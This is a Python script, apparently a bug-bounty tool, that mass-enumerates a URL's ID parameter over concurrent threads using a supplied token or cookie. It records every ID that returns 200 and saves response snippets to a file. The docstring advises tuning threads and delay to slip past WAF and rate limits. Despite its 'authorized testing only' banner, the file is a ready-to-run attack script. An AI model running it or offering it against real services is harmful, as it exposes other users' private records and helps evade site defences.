#!/usr/bin/env python3
"""
Threaded IDOR Mass Enumerator
==============================
Fast concurrent IDOR enumeration using thread pools.
Much faster than sequential scanning for large ID ranges.

Usage: python3 threaded_idor_enum.py --help

⚠️  For authorized testing only. Always stay within program scope.
    Reduce --threads and increase --delay to avoid triggering WAF/rate-limits.
"""

import argparse
import requests
import json
import time
import threading
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor, as_completed

GREEN  = "\033[92m"
RED    = "\033[91m"
YELLOW = "\033[93m"
CYAN   = "\033[96m"
RESET  = "\033[0m"
BOLD   = "\033[1m"

lock = threading.Lock()
results = []

def banner():
    print(f"""{CYAN}{BOLD}
╔══════════════════════════════════════════╗
║    Threaded IDOR Mass Enumerator v1.0    ║
║   For authorized bug bounty testing only ║
╚══════════════════════════════════════════╝{RESET}
""")

def build_url(base_url: str, param: str, value: int) -> str:
    if "?" in base_url:
        return f"{base_url}&{param}={value}"
    return f"{base_url}?{param}={value}"

def probe(args, headers, resource_id: int) -> dict | None:
    url = build_url(args.url, args.param, resource_id)
    try:
        resp = requests.get(url, headers=headers, timeout=10)
        return {
            "id": resource_id,
            "url": url,
            "status": resp.status_code,
            "length": len(resp.text),
            "snippet": resp.text[:200]
        }
    except requests.exceptions.RequestException as e:
        return {"id": resource_id, "url": url, "status": "ERR", "error": str(e)}

def run(args):
    banner()

    headers = {"User-Agent": "ThreadedIDOR/1.0", "Accept": "application/json"}
    if args.token:
        headers["Authorization"] = f"Bearer {args.token}"
    if args.cookie:
        headers["Cookie"] = args.cookie

    total = args.end - args.start + 1
    found = 0
    errors = 0

    print(f"{BOLD}[*] Target    : {args.url}{RESET}")
    print(f"{BOLD}[*] Param     : {args.param}{RESET}")
    print(f"{BOLD}[*] Range     : {args.start} → {args.end}  ({total} IDs){RESET}")
    print(f"{BOLD}[*] Threads   : {args.threads}{RESET}")
    print(f"{BOLD}[*] Delay     : {args.delay}s per thread{RESET}\n")

    id_range = range(args.start, args.end + 1)

    with ThreadPoolExecutor(max_workers=args.threads) as executor:
        futures = {executor.submit(probe, args, headers, i): i for i in id_range}

        for future in as_completed(futures):
            time.sleep(args.delay)
            result = future.result()

            status = result.get("status")
            rid    = result.get("id")
            length = result.get("length", 0)

            with lock:
                if status == 200:
                    print(f"  {GREEN}[HIT]{RESET}  ID={rid} | 200 OK | Len={length}")
                    results.append(result)
                    found += 1
                elif status == 403:
                    print(f"  {YELLOW}[403]{RESET}  ID={rid} | Forbidden")
                elif status == 404:
                    pass  # Suppress 404 noise
                elif status == "ERR":
                    print(f"  {RED}[ERR]{RESET}  ID={rid} | {result.get('error','')}")
                    errors += 1
                else:
                    print(f"  [???]  ID={rid} | Status={status}")

    if results and args.output:
        with open(args.output, "w") as f:
            json.dump(results, f, indent=2)
        print(f"\n{GREEN}[+] Results saved to: {args.output}{RESET}")

    print(f"\n{BOLD}{'─'*45}")
    print(f"  Total Tested : {total}")
    print(f"  Found (200)  : {found}")
    print(f"  Errors       : {errors}")
    print(f"  Timestamp    : {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
    print(f"{'─'*45}{RESET}")


def main():
    parser = argparse.ArgumentParser(
        description="Threaded IDOR Mass Enumerator — authorized testing only",
        formatter_class=argparse.RawTextHelpFormatter
    )
    parser.add_argument("--url",     required=True,  help="Base endpoint URL")
    parser.add_argument("--param",   required=True,  help="Parameter to enumerate (e.g. invoice_id)")
    parser.add_argument("--start",   type=int, default=1,    help="Start ID (default: 1)")
    parser.add_argument("--end",     type=int, default=1000, help="End ID (default: 1000)")
    parser.add_argument("--threads", type=int, default=10,   help="Concurrent threads (default: 10)")
    parser.add_argument("--token",   default=None, help="Bearer token")
    parser.add_argument("--cookie",  default=None, help="Cookie string")
    parser.add_argument("--delay",   type=float, default=0.1, help="Per-thread delay (default: 0.1s)")
    parser.add_argument("--output",  default="threaded_results.json", help="Output file")
    args = parser.parse_args()
    run(args)

if __name__ == "__main__":
    main()
